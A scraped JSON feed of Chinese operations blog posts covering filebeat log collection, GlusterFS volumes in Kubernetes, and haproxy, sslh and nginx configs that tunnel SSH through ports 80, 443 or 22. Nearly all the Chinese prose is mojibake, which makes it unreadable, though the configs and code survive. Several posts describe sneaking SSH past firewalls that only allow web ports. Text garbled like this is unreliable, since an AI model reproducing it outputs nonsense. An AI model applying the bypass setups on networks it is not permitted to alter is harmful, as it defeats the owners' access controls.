-\u0026gt; None: 21 with ThreadPoolExecutor(max_workers=10) as executor: 22 executor.map(download_link,url_list) 23 24start = time.time() 25download_all(url_list) 26end = time.time() 27print(f\u0026#39;download {len(url_list)} links in {end - start} seconds\u0026#39;) ","date":"2021-11-12","img":"","permalink":"https://rendoumi.com/posts/20211112-python_aiohttp/","series":null,"tags":null,"title":"Pythonçš„åç¨‹è¯¦ç»†è§£é‡Š"},{"categories":null,"content":"æˆ‘ä»¬ä»‹ç»äº†å¦‚ä½•åœ¨ kubernetes ç¯å¢ƒä¸­ä½¿ç”¨ filebeat sidecar æ–¹å¼æ”¶é›†æ—¥å¿—\nä½¿ç”¨çš„æ˜¯ filebeat çš„ moudle æ¨¡å—ï¼Œä½†å‡¡æ˜¯å¸¸ç”¨çš„è½¯ä»¶ï¼ŒåŸºæœ¬éƒ½æœ‰å¯¹åº”çš„æ¨¡å—å¯ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆåº”è¯¥ä½¿ç”¨æ¨¡å—æ¥æ”¶é›†æ—¥å¿—ã€‚\né‚£å¯¹äºä¸€äº›æˆ‘ä»¬è‡ªå·±å†™çš„ Go è½¯ä»¶å‘¢ï¼Œæˆ–è€…æ ¹æœ¬ä¸æ˜¯æ ‡å‡†çš„ï¼Œé‚£è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\né‚£å°±è‡ªå®šä¹‰ filebeat.inputsï¼Œç½‘ä¸Šçš„ filebeat ä¾‹å­ï¼Œå…¶å®å¤§å¤šéƒ½æ˜¯è¿™æ ·çš„\nå¾ˆç®€å•ï¼Œç»™ä¸ªä¾‹å­\n1[beat-logstash-some-name-832-2015.11.28] IndexNotFoundException[no such index] 2 at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:566) 3 at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:133) 4 at org.elasticsearch.cluster.metadata.(IndexNameExpressionResolver.java:77) 5 at org.elasticsearch.action.admin..checkBlock(TransportDeleteIndexAction.java:75) çœ‹å¦‚ä¸Šæ—¥å¿—ï¼Œå¦‚æœä¸ç”¨æ¨¡å¼åŒ¹é…çš„è¯ï¼Œé‚£ä¹ˆä¼šé€5æ¡è®°å½•åˆ° ESï¼Œ Kibana çœ‹èµ·æ¥å°±ååˆ†å‰²è£‚äº†ã€‚\næ‰€ä»¥è¦ç”¨æ­£åˆ™æŠŠåº•ä¸‹çš„4è¡Œå’Œä¸Šé¢çš„ç¬¬1è¡Œåˆåœ¨ä¸€èµ·ï¼Œåˆå¹¶æˆä¸€æ¡å°±è®°å½•æ¨é€åˆ° ES å»\nä»”ç»†è§‚å¯Ÿï¼Œå¼€å¤´ä¸€è¡Œæ˜¯ä»¥ [ å¼€å§‹çš„ï¼Œæ‰€ä»¥æ­£åˆ™å°±æ˜¯ \u0026lsquo;^\\[\u0026rsquo;ï¼Œæˆ‘ä»¬è¦åŒ¹é…çš„æ˜¯åº•ä¸‹çš„4è¡Œï¼Œå¿…é¡»åè½¬ä¸€ä¸‹æ¨¡å¼ã€‚\nmultiline çš„ negate å±æ€§ï¼Œè¿™ä¸ªæ˜¯æŒ‡å®šæ˜¯å¦åè½¬åŒ¹é…åˆ°çš„å†…å®¹ï¼Œè¿™é‡Œå¦‚æœæ˜¯ true çš„è¯ï¼Œåè½¬ï¼Œé‚£å°±æ˜¯é€‰æ‹©ä¸ä»¥ [ å¼€å¤´çš„è¡Œã€‚ netgate å±æ€§çš„ç¼ºçœå€¼æ˜¯ false\nmultiline çš„ match å±æ€§ï¼Œafter æŒ‡è¿½åŠ åˆ°ä¸Šä¸€æ¡äº‹ä»¶ï¼ˆå‘ä¸Šåˆå¹¶ï¼‰ï¼Œbefore æŒ‡åˆå¹¶åˆ°ä¸‹ä¸€æ¡ï¼ˆå‘ä¸‹åˆå¹¶ï¼‰\näºæ˜¯ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™å‡ºä»¥ä¸‹çš„åŒ¹é…æ¨¡å¼ï¼Œè¿™æ ·å°±æŠŠåŒ¹é…åˆ°æ¡ç›®è¿½åŠ åˆ°ä¸Šä¸€æ¡ï¼Œåˆå¹¶åœ¨ä¸€èµ·äº†ï¼š\n1filebeat.inputs: 2 - type: log 3 enabled: true 4 paths: 5 - /Users/liuxg/data/multiline/multiline.log 6 multiline.type: pattern 7 multiline.pattern: \u0026#39;^\\[\u0026#39; 8 multiline.negate: true 9 multiline.match: after 10 11output.elasticsearch: 12 hosts: [\u0026#34;localhost:9200\u0026#34;] 13 index: \u0026#34;multiline\u0026#34; å†ç»™ä¸ªä¾‹å­ï¼Œjava çš„ stack è°ƒç”¨ï¼Œæ—¥å¿—æ ¼å¼å¦‚ä¸‹ï¼š\n1Exception in thread \u0026#34;main\u0026#34; java.lang.NullPointerException 2 at com.example.myproject.Book.getTitle(Book.java:16) 3 at com.example.myproject.Author.getBookTitles(Author.java:25) 4 at com.example.myproject.Bootstrap.main(Bootstrap.java:14) åˆ†æä¸€ä¸‹ï¼š\nåŒ¹é…åˆ°å¼€å¤´æ˜¯ç©ºæ ¼çš„é‚£äº›è¡Œï¼Œæ­£åˆ™ \u0026lsquo;^[[:space]]\u0026rsquo; åŒ¹é…çš„è¡Œä¸åè½¬ï¼Œå°±æ˜¯è¦é‚£äº›ç©ºæ ¼å¼€å¤´çš„è¡Œï¼Œæ‰€ä»¥ negate æ˜¯ç¼ºçœçš„ false åŒ¹é…çš„ç©ºæ ¼è¡Œè¿½åŠ åˆ°ä¸Šä¸€ä¸ªäº‹ä»¶ï¼Œå‘ä¸Šåˆå¹¶ï¼Œæ‰€ä»¥ match æ˜¯ after 1filebeat.inputs: 2 - type: log 3 enabled: true 4 paths: 5 - /Users/liuxg/data/multiline/multiline.log 6 multiline.type: pattern 7 multiline.pattern: \u0026#39;^[[:space:]]\u0026#39; 8 multiline.negate: false 9 multiline.match: after å†ç»™ä¸ªä¾‹å­ï¼Œå‡å¦‚ä½ åœ¨ Go ç¨‹åºé‡Œå®šä¹‰äº†è¾“å‡ºæ—¥å¿—çš„æ ¼å¼ï¼Œä»¥ Start new event å¼€å¤´ï¼Œä»¥ End event ç»“å°¾\n1[2015-08-24 11:49:14,389] Start new event 2[2015-08-24 11:49:14,395] Content of processing something 3[2015-08-24 11:49:14,399] End event 4[2015-08-24 11:50:14,389] Some other log 5[2015-08-24 11:50:14,395] Some other log 6[2015-08-24 11:50:14,399] Some other log 7[2015-08-24 11:51:14,389] Start new event 8[2015-08-24 11:51:14,395] Content of processing something 9[2015-08-24 11:51:14,399] End event æˆ‘ä»¬å°±ç”¨åˆ° filebeat multiline çš„å¦ä¸€ä¸ªå¼€å…³ï¼Œflush_patternï¼Œæ¥æ§åˆ¶å¦‚ä½•ç»“æŸï¼Œæ³¨æ„ negate æ˜¯ true ï¼ŒåŒ¹é…åˆ°çš„æ˜¯ Start å’Œ End ä¸­é—´çš„éƒ¨åˆ†ï¼š\n1multiline.type: pattern 2multiline.pattern: \u0026#39;Start new event\u0026#39; 3multiline.negate: true 4multiline.match: after 5multiline.flush_pattern: \u0026#39;End event\u0026#39; 6 7filebeat.inputs: 8 - type: log 9 enabled: true 10 paths: 11 - /Users/liuxg/data/multiline/multiline.log 12 multiline.type: pattern 13 multiline.pattern: \u0026#39;Start new event\u0026#39; 14 multiline.negate: true 15 multiline.match: after 16 multiline.flush_pattern: \u0026#39;End event\u0026#39; ç»™ä¸¤ç¯‡å‚è€ƒï¼Œå¤§å®¶ä¸€å®šè¦å…ˆçœ‹é‚£ç¯‡åŸç‰ˆè‹±æ–‡çš„ï¼Œä¸­æ–‡çš„é‚£ç¯‡ç¿»å¾—ä¸å¤ªå¥½ï¼›æœ€å¥½ä¸¤ç¯‡å¯¹ç…§ç€çœ‹ã€‚\nå‚è€ƒï¼š\nhttps://www.elastic.co/guide/en/beats/filebeat/current/multiline-examples.html https://developer.aliyun.com/article/764544 ","date":"2021-11-11","img":"","permalink":"https://rendoumi.com/posts/20211111-k8s_filebeat/","series":null,"tags":null,"title":"Kubernetesä½¿ç”¨filebeat Multilineè‡ªå®šä¹‰æ”¶é›†æ—¥å¿—"},{"categories":null,"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä½¿ç”¨ Kubernetes ï¼Œç»•ä¸è¿‡å»çš„ä¸€ä¸ªé—®é¢˜å°±æ˜¯æŒä¹…åŒ–å·ã€‚\nå¦‚æœæ˜¯ä½¿ç”¨é˜¿é‡Œ ACK æ‰˜ç®¡å¹³å°çš„è¯ï¼Œå¯ä»¥ç”¨ OSS æ¥æŒä¹…åŒ–å·ï¼Œå¦‚æœæ˜¯è‡ªæ­çš„ kubernetesï¼Œé‚£ä¹ˆå­˜å‚¨å°±éœ€è¦ä»”ç»†è€ƒè™‘äº†ã€‚\ncephæ¯”è¾ƒå¤æ‚ï¼Œå®¹æ˜“å‡ºæ•…éšœã€‚nfs ä¹Ÿä¸å¯ç”¨ï¼Œæ¯›ç—…å¤šå¤šã€‚minioå€’æ˜¯å¯ä»¥ã€‚\nè¿™ç§æƒ…å†µä¸‹ä½¿ç”¨åŒå‰¯æœ¬çš„ GlusterFS å°±æ˜¯ä¸é”™çš„é€‰æ‹©ã€‚\nç”Ÿäº§ç¯å¢ƒå°±ä¸èƒ½éšæ„äº†ï¼Œæœ€å¥½ä¸è¦ä½¿ç”¨ Heketiï¼Œå› ä¸ºå‡¡æ˜¯è¦æŒä¹…åŒ–çš„ä¸œè¥¿ï¼Œéƒ½æ˜¯æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ï¼Œæœ€å¥½éƒ½æœ‰ yaml è®°å½•ã€‚\nGlusterFS çš„æ­å»ºå°±ä¸è¯´äº†ã€‚è¯´è¯´å®é™…ä½¿ç”¨è¿‡ç¨‹ï¼š\nä¸€ã€è£…GFSï¼Œç”Ÿäº§æ–°å· å®‰è£…å°±ä¸è¯´äº†ï¼Œæˆ‘ä»¬çš„GFSæœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œ172.19.20.18 å’Œ 172.19.20.36ï¼Œæˆ‘ä»¬å¼ºåˆ¶å»ºç«‹ä¸€ä¸ªä¸¤å‰¯æœ¬çš„å·ï¼š kuaijian-vol\n1gluster volume create kuaijian-vol replica 2 transport tcp 172.19.20.18:/glusterfs/kuaijian-vol 172.19.20.36:/glusterfs/kuaijian-vol force äºŒã€ä¸ºk8säº§ç”ŸGFSçš„endingpointå’Œservice 1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; ep-svc.yaml 2--- 3apiVersion: v1 4kind: Service 5metadata: 6 name: gfs-cluster_svc 7spec: 8 ports: 9 - port: 1 10--- 11apiVersion: v1 12kind: Endpoints 13metadata: 14 name: gfs-cluster_svc 15subsets: 16 - addresses: 17 - ip: 172.19.20.18 18 ports: 19 - port: 1 20 - addresses: 21 - ip: 172.19.20.36 22 ports: 23 - port: 1 24EOF 25 26kubectl apply -f ep-svc.yaml è¿™é‡Œè¦æä¸€ä¸ªæ¦‚å¿µï¼Œé€šå¸¸æƒ…å†µä¸‹ service æ˜¯é€šè¿‡ selector æ ‡ç­¾æ¥é€‰æ‹©å¯¹åº”çš„ pod æ¥å¢åŠ  endingpoint çš„ã€‚å¦‚ä¸‹ï¼š\n1apiVersion: v1 2kind: Service 3metadata: 4 name: go-api_svc 5spec: 6 ports: 7 - port: 8080 8 protocol: TCP 9 targetPort: 8080 10 selector: 11 app: go-api 12 type: ClusterIP è€Œä¸Šé¢ï¼Œæˆ‘ä»¬æ²¡æœ‰é€šè¿‡æ ‡ç­¾ï¼Œè€Œæ˜¯è®© endingpoint å’Œ svc åŒåè€Œæ‰‹åŠ¨å¢åŠ  endingpoint åˆ° svc çš„ã€‚\nä¸‰ã€ä¸ºk8sç”Ÿäº§åˆ›å»º PVå’ŒPVC é™æ€ç¯å¢ƒä¸ä½¿ç”¨ Storageclass æŒä¹…åŒ–å·çš„å›¾è§£å¦‚ä¸‹ï¼Œpodåšpvcå£°æ˜ï¼Œpvcè¿æ¥åˆ°pvï¼Œpvä»GFSä¸­æ‹¿åˆ°å·ã€‚\né¦–å…ˆå£°æ˜ä¸€ä¸ª pvï¼š\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pv.yaml 2apiVersion: v1 3kind: PersistentVolume 4metadata: 5 name: gfs-kuaijian-50G_pv 6 labels: 7 name: gfs-kuaijian-50G_pv 8spec: 9 capacity: 10 storage: 50Gi 11 accessModes: 12 - ReadWriteMany 13 glusterfs: 14 endpoints: gfs-cluster_svc 15 path: kuaijian-vol 16 readOnly: false 17 persistentVolumeReclaimPolicy: Retain 18EOF 19 20kubectl apply -f kuaijian-pv.yaml ç„¶åå£°æ˜ä¸€ä¸ª pvc é€šè¿‡ matchLabels æ¥è·Ÿä¹‹å‰çš„ pv ç»‘å®šã€‚\n1cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; kuaijian-pvc.yaml 2kind: PersistentVolumeClaim 3apiVersion: v1 4metadata: 5 name: gfs-kuaijian-50G_pvc 6spec: 7 accessModes: 8 - ReadWriteMany 9 resources: 10 requests: 11 storage: 50Gi 12 selector: 13 matchLabels: 14 name: gfs-kuaijian-50G_pv 15EOF 16 17kubectl apply -f kuaijian-pvc.yaml æ³¨æ„ä¸Šé¢çš„ pvcï¼Œæˆ‘ä»¬ä¸€ä¸‹å­ç”³è¯·äº†50Gï¼ŒæŠŠæ•´ä¸ª pv ç©ºé—´å…¨ç”¨å…‰äº†ï¼›å½“ç„¶æˆ‘ä»¬ä¹Ÿå¯ä»¥åªç”³è¯·ä¸ª 10Giï¼Œä¸‹ä¸ª pvc å† 10Giï¼Œè¿™æ ·ä¹Ÿæ˜¯è¡Œçš„é€šçš„ã€‚\nå››ã€PODä½¿ç”¨PVC å£°æ˜ä¸€ä¸ª Nginx çš„ Deployment æ¥ä½¿ç”¨è¿™ä¸ª pvc\n1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: nginx-deployment 5 labels: 6 app: nginx 7spec: 8 replicas: 2 9 selector: 10 matchLabels: 11 app: nginx 12 template: 13 metadata: 14 labels: 15 app: nginx 16 spec: 17 containers: 18 - name: nginx 19 image: nginx 20 ports: 21 - containerPort: 80 22 volumeMounts: 23 - name: data-www 24 mountPath: /data/www 25 volumes: 26 - name: data-www 27 persistentVolumeClaim: 28 claimName: gfs-kuaijian-50G_pvc è¿™æ · kubernetes çš„å­˜å‚¨éƒ¨åˆ†å°±æå®šäº†ã€‚GFS ç”¨äºç”Ÿäº§éå¸¸ç¨³å®šï¼ŒåŸºæœ¬è·‘äº† 7 å¹´äº†æ²¡æœ‰å¤§æ¯›ç—…ã€‚\n","date":"2021-11-10","img":"","permalink":"https://rendoumi.com/posts/20211110-k8s_gfs/","series":null,"tags":null,"title":"ç”Ÿäº§ç¯å¢ƒkubernetesä½¿ç”¨æŒä¹…åŒ–å·GlusterFS"},{"categories":null,"content":"åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒES é€šå¸¸æ˜¯ä¸ä¼šåœ¨ k8s é›†ç¾¤ä¸­å­˜åœ¨çš„ï¼Œä¸€èˆ¬ MySQL å’Œ Elasticsearch éƒ½æ˜¯ç‹¬ç«‹åœ¨ k8s ä¹‹å¤–ã€‚\né‚£ä¹ˆæ— è®ºå“ªç§ podï¼Œè¦ç”©æ—¥å¿—åˆ° ESï¼Œæœ€è½»é‡çš„æ–¹æ¡ˆè‚¯å®šæ˜¯ç”¨ filebeat ç”©è¿‡å»äº†ã€‚\nå½“ç„¶ï¼Œå¦‚æœæ˜¯é˜¿é‡Œçš„ ACKï¼Œlogtail å’Œ logstore é…æ­å·²ç»éå¸¸ä¸é”™äº†ï¼Œæ ¹æœ¬ç”¨ä¸åˆ° filebeat å’Œ ESã€‚\nå¯ä½†æ˜¯ï¼Œæˆ‘ä»¬ä¸æƒ³ä¸ºé˜¿é‡Œ slsã€logstore å‡ºé’±ä¹°å•ï¼Œå°±åªèƒ½ç”¨ filebeat + ES äº†\nè¯´ä¸€ä¸‹ filebeat çš„ sidecar è¾¹è½¦ï¼ˆåƒšæœºï¼‰ç”¨æ³•ï¼š\nå¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œç®€å•è¯´å°±æ˜¯èµ·ä¸€ä¸ª filebeat çš„ logging-agent è¾¹è½¦ï¼ˆåƒšæœºï¼‰ï¼Œè¾¹è½¦å’Œä¸»åº”ç”¨ä¹‹é—´å…±äº«æŸä¸ªæ–‡ä»¶å¤¹ï¼ˆmountPathï¼‰ï¼Œè¾¾åˆ°æ”¶é›†ä¸»åº”ç”¨æ—¥å¿—å¹¶å‘é€åˆ° ESï¼Œè€Œä¸ç”¨åŠ¨ app-container åˆ†æ¯«ã€‚\næˆ‘ä»¬ä»¥éƒ¨ç½²ä¸€ä¸ª Tomcat åº”ç”¨ä¸ºä¾‹æ¥è¯´æ˜ï¼š\nä¸€ã€æ‰“é€  filebeat è¾¹è½¦é•œåƒ é¦–å…ˆå‡†å¤‡ Dockerfile\n1FROM alpine:3.12 2 3ARG VERSION=7.15.1 4 5COPY docker-entrypoint.sh / 6 7RUN set -x \\ 8 \u0026amp;\u0026amp; cd /tmp \\ 9 \u0026amp;\u0026amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \\ 10 \u0026amp;\u0026amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \\ 11 \u0026amp;\u0026amp; mv filebeat-${VERSION}-linux-x86_64 /opt \\ 12 \u0026amp;\u0026amp; rm /tmp/* \\ 13 \u0026amp;\u0026amp; chmod +x /docker-entrypoint.sh 14 15 16ENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64 17 18WORKDIR /opt/filebeat-${VERSION}-linux-x86_64 19 20ENTRYPOINT [\u0026#34;/docker-entrypoint.sh\u0026#34;] æˆ‘ä»¬ä»¥ alphine:3.12 ä¸ºåº•ç‰ˆï¼Œç„¶åä¸‹è½½ filebeat 7.15.1çš„äºŒè¿›åˆ¶åŒ…å¹¶é‡Šæ”¾åˆ° /opt ä¸‹ï¼Œæœ€åæŒ‡å®šå…¥å£æ–‡ä»¶ /docker-entrypoint.sh\nå¥¥å¦™å…¨åœ¨è¿™ä¸ª docker-entrypoint.sh ä¸­äº†\n1#!/bin/bash 2 3cat \u0026gt; /etc/filebeat.yaml \u0026lt;\u0026lt; EOF 4filebeat.config.modules: 5 path: /opt/filebeat-7.15.1-linux-x86_64/modules.d/*.yml 6 reload.enabled: true 7 8# åŠ å…¥è‡ªå®šä¹‰çš„å­—æ®µ 9fields_under_root: true 10fields: 11 project: kuaijian-tomcat 12 pod_ip: ${POD_IP} 13 pod_name: ${POD_NAME} 14 node_name: ${NODE_NAME} 15 pod_namespace: ${POD_NAMESPACE} 16 17# æ”¶é›†äº‘å‚å•†çš„æ•°æ®å’Œdockerçš„å˜é‡ 18processors: 19 - add_cloud_metadata: ~ 20 - add_docker_metadata: ~ 21 22filebeat.modules: 23 - module: apache 24 access: 25 enabled: true 26 var.paths: 27 - \u0026#34;/usr/local/tomcat/logs/localhost_access_log.*.txt\u0026#34; 28 error: 29 enabled: true 30 var.paths: 31 - \u0026#34;/usr/local/tomcat/logs/application.log*\u0026#34; 32 - \u0026#34;/usr/local/tomcat/logs/catalina.*.log\u0026#34; 33 - \u0026#34;/usr/local/tomcat/logs/host-manager.*.log\u0026#34; 34 - \u0026#34;/usr/local/tomcat/logs/localhost.*.log\u0026#34; 35 - \u0026#34;/usr/local/tomcat/logs/manager.*.log\u0026#34; 36 37setup.template.name: \u0026#34;tomcat-logs\u0026#34; 38setup.template.pattern: \u0026#34;tomcat-logs-*\u0026#34; 39output.elasticsearch: 40 hosts: [\u0026#34;172.19.20.xxx:9200\u0026#34;,\u0026#34;172.19.20.xxx:9200\u0026#34;] 41 index: \u0026#34;tomcat-logs-%{+yyyy.MM}\u0026#34; 42EOF 43 44set -xe 45 46# If user don\u0026#39;t provide any command 47# Run filebeat 48if [[ \u0026#34;$1\u0026#34; == \u0026#34;\u0026#34; ]]; then 49 exec /opt/filebeat-7.15.1-linux-x86_64/filebeat -c /etc/filebeat.yaml 50else 51 # Else allow the user to run arbitrarily commands like bash 52 exec \u0026#34;$@\u0026#34; 53fi æˆ‘ä»¬ä¸ºä»€ä¹ˆä¸åœ¨ k8s é‡Œç”¨ configmap æ¥é…ç½® filebeat.yml å‘¢ï¼Ÿ\nç†ç”±æ˜¯æ”¶é›†æ—¥å¿—æ–‡ä»¶å¤šä¸”è·¯å¾„ã€ç±»å‹å„ä¸ç›¸åŒï¼Œè¿™ä¹ˆä¸€å †çš„é…ç½®éƒ½æ”¾åœ¨ configmap é‡Œä¼šè®©äººç™«ç‹‚çš„ã€‚æ‰€ä»¥å¹²è„†æ”¾åˆ°é•œåƒé‡Œï¼Œä¾¿äºè°ƒè¯•ä¹Ÿä¾¿äºä¿®æ”¹ã€‚\nä¸Šé¢æˆ‘ä»¬ä¹Ÿå……åˆ†åˆ©ç”¨äº† filebeat çš„ moduleï¼Œæœ‰ module å¯ç”¨å°±å¿…é¡»ç”¨ moduleï¼Œè€Œä¸æ˜¯æ‰‹åŠ¨æŒ‡å®š filebeat.inputs ï¼Œå¯ç”¨çš„ mudole å®åœ¨å¤ªå¤šäº†ï¼Œä¸€å®šè¦å–„ç”¨ï¼ï¼ï¼å¦å¤– tomcat å’Œ apache çš„æ—¥å¿—æ ¼å¼æ˜¯ä¸€æ ·çš„ã€‚\næˆ‘ä»¬åœ¨æœ€åæ‰§è¡Œçš„æ—¶å€™ï¼Œä¹ŸåŠ äº† exec $@ ä¾¿äºè°ƒè¯•ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®š CMDï¼Œå°±å¯åŠ¨ filebeatï¼Œå¦‚æœæŒ‡å®šäº†æ¯”å¦‚ /bin/bashï¼Œå°±è¿›å…¥è°ƒè¯•çŠ¶æ€ã€‚\næˆ‘ä»¬æ‰“å¥½é•œåƒå°± push åˆ° harbor é‡Œå¾…ç”¨\né™„å½•ï¼šhttps://www.elastic.co/guide/en/beats/filebeat/current/configuration-general-options.html filebeatçš„é…ç½®åˆ—è¡¨\näºŒã€sidecaréƒ¨ç½² æˆ‘ä»¬å†™ä¸€ä¸ª k8s çš„ tomcat deploymentæ–‡ä»¶ï¼š\n1apiVersion: apps/v1 2kind: Deployment 3metadata: 4 name: tomcat 5 labels: 6 app: tomcat 7spec: 8 replicas: 1 9 selector: 10 matchLabels: 11 app: tomcat 12 template: 13 metadata: 14 labels: 15 app: tomcat 16 spec: 17 containers: 18 - name: filebeat-sidecar 19 image: xxxx.xxxx.xxx/filebeat:xxx 20 env: 21 - name: POD_NAMESPACE 22 valueFrom: 23 fieldRef: 24 apiVersion: v1 25 fieldPath: metadata.namespace 26 - name: NODE_NAME 27 valueFrom: 28 fieldRef: 29 apiVersion: v1 30 fieldPath: spec.nodeName 31 - name: POD_IP 32 valueFrom: 33 fieldRef: 34 apiVersion: v1 35 fieldPath: status.podIP 36 - name: POD_NAME 37 valueFrom: 38 fieldRef: 39 apiVersion: v1 40 fieldPath: metadata.name 41 volumeMounts: 42 - name: logs-volume 43 mountPath: /usr/local/tomcat/logs 44 - name: tomcat 45 image: tomcat 46 ports: 47 - containerPort: 8080 48 volumeMounts: 49 - name: logs-volume 50 mountPath: /usr/local/tomcat/logs 51 volumes: 52 - name: logs-volume 53 emptyDir: {} å¯ä»¥çœ‹åˆ°æˆ‘ä»¬åœ¨è¿™ä¸ª deployment é‡Œå®šä¹‰äº† pod æ˜¯å•å‰¯æœ¬ï¼Œé‡Œé¢è·‘äº†ä¸¤ä¸ª containerï¼Œä¸€ä¸ªæ˜¯ filebeatï¼Œä¸€ä¸ªæ˜¯ tocmatï¼Œä¸¤è€…é€šè¿‡åŒä¸€ä¸ª volume è¿æ¥åœ¨ä¸€èµ·ï¼Œè¿™æ ·å°±å¯ä»¥åšåˆ°ä¸ä¿®æ”¹ tomcat container è€Œæ‹¿åˆ°é‡Œé¢çš„æ—¥å¿—äº†ã€‚\nè¿™æ ·å°±æŠŠ tomcat åº”ç”¨çš„æ—¥å¿—æ”¶åˆ° ES å»äº†ã€‚\n","date":"2021-11-10","img":"","permalink":"https://rendoumi.com/posts/20211110-k8s_sidecar/","series":null,"tags":null,"title":"Kubernetesç”Ÿäº§ç¯å¢ƒä½¿ç”¨filebeat Sidecaræ”¶é›†æ—¥å¿—"},{"categories":null,"content":"æˆ‘ä»¬é€‰æ‹© haproxy 1.8 ç‰ˆæœ¬ä»¥ä¸Šçš„ï¼Œç¼–è¯‘å®‰è£…åˆ°è·¯å¾„ /export/servers/haproxy\n1make TARGET=linux2628 PREFIX=/export/servers/haproxy USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ 2 USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 3 4make install PREFIX=/export/servers/haproxy ç¼–è¾‘ haproxy.conf é…ç½®æ–‡ä»¶ï¼š\n1global 2 maxconn 5120 3 chroot /export/servers/haproxy 4 daemon 5 quiet 6 nbproc 2 7 pidfile /tmp/haproxy.pid 8 9defaults 10 timeout connect 5s 11 timeout client 50s 12 timeout server 20s 13 14listen http 15 bind :80 16 timeout client 1h 17 tcp-request inspect-delay 2s 18 acl is_http req_proto_http 19 tcp-request content accept if is_http 20 server server-http :8080 21 use_backend ssh if !is_http 22 23backend ssh 24 mode tcp 25 timeout server 1h 26 server server-ssh :22 è§£é‡Šä¸€ä¸‹ï¼šæˆ‘ä»¬åœ¨ 8080 ç«¯å£å¼€äº† http æœåŠ¡ï¼Œåœ¨ 22 ç«¯å£å¼€äº† ssh æœåŠ¡ï¼Œ80ç«¯å£ç”± haproxy åšä»£ç†è½¬å‘ï¼Œé¦–å…ˆåˆ¤æ–­å®¢æˆ·ç«¯è¯·æ±‚æ˜¯å¦æ˜¯ http è¯·æ±‚ï¼Œå¦‚æœæ˜¯å°±è½¬å‘åˆ° 8080 ç«¯å£ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±è½¬å‘åˆ° 22 ç«¯å£ï¼Œè¿™æ ·å°±å®ç°äº† 80 ç«¯å£åŒæ—¶è·‘ http å’Œ ssh ä¸¤ä¸ªæœåŠ¡ã€‚\n","date":"2021-11-10","img":"","permalink":"https://rendoumi.com/posts/20211110-haproxy_multiple_port/","series":null,"tags":null,"title":"Haproxyä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡"},{"categories":null,"content":"Ucloudçš„æœºå™¨åœ¨ä¸¤ä¼šæœŸé—´å¹²è„†ç«¯å£å…¨ç­ï¼Œfirewallè®¾ç½®è¿›æ¥çš„ç«¯å£å…¨å…³é—­ï¼ï¼ï¼ï¼ï¼ï¼\nè¿˜å¥½æœ‰ä¸ªGlobal sshçš„æœåŠ¡ï¼Œå¯ä»¥ ssh ubuntu@111.129.37.89.ipssh.net ç™»å½•ä¸Šå»ï¼Œæ³¨æ„ï¼Œç›´æ¥ssh ubuntu@111.129.37.89 æ˜¯ä¸é€šçš„ã€‚\né‚£æˆ‘ä»¬å°±æ­å»ºä¸€ä¸ªSSLHæœåŠ¡ï¼Œå¯ä»¥æŠŠsshå’Œopenvpnä»¥åŠsslæœåŠ¡ç»Ÿç»Ÿå¡åˆ°ä¸€ä¸ªç«¯å£22é‡Œ\nåŠ¨æ‰‹å§\n1ã€ä¿®æ”¹opensshçš„ç«¯å£ ä»22ç«¯å£æ”¹æˆ2222ï¼Œåƒä¸‡åˆ«é‡å¯ï¼Œ22è¿™ä¼šå…ˆå¾—å½’sshç”¨\n2ã€å®‰è£…sslh\n1sudo apt install sslh 2vi /etc/default/sslh 3 4æ‰¾åˆ°Run=no 5æ”¹æˆRun=yes 6 7ç„¶ååˆ°ä¸‹é¢ï¼ŒæŒ‰éœ€é…ç½®ï¼ˆä¸è·‘443çš„è¯å¯ä»¥ä¸é…ï¼‰ 8DAEMON_OPTS=\u0026#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5\u0026#34; 3ã€é…ç½®sslhå¹¶ä¸”é‡å¯æœåŠ¡å™¨\n1sudo systemctl enable sslh 2sudo reboot å°±æå®šäº†\n","date":"2021-11-10","img":"","permalink":"https://rendoumi.com/posts/20211110-sslh_multiple_port/","series":null,"tags":null,"title":"Sslhçš„ä¸€ä¸ªç«¯å£åŒæ—¶è·‘å¤šä¸ªæœåŠ¡"},{"categories":null,"content":"è¿™ä¸ªè¦æ±‚æŒºå¤æ€ªçš„ï¼ŒèƒŒæ™¯æ˜¯é˜²ç«å¢™åªå¼€äº† nginx 443 ç«¯å£ã€‚æˆ‘ä¹Ÿæƒ³åŒæ—¶ ssh ç™»å½•è¿›å»ï¼Œä½†æ˜¯F5æ²¡å¼€IP\nå°±åªèƒ½è¿™ä¹ˆå¹²äº†ï¼Œè®© Nginx ä¸€ä¸ªç«¯å£è·‘å¤šä¸ªæœåŠ¡\nåœ¨ nginx.conf åŠ ä¸€æ®µï¼Œstream é…ç½®ï¼Œnginx çš„ ip æ˜¯ 192.168.8.110ï¼š\n1 2#Multi Ports 3stream { 4 upstream ssh { 5 server 192.168.8.112:22; 6 } 7 8 upstream https { 9 server 192.168.8.111:443; 10 } 11 12 map $ssl_preread_protocol $upstream { 13 default ssh; 14 \u0026#34;TLSv1.2\u0026#34; https; 15 \u0026#34;TLSv1.3\u0026#34; https; 16 \u0026#34;TLSv1.1\u0026#34; https; 17 \u0026#34;TLSv1.0\u0026#34; 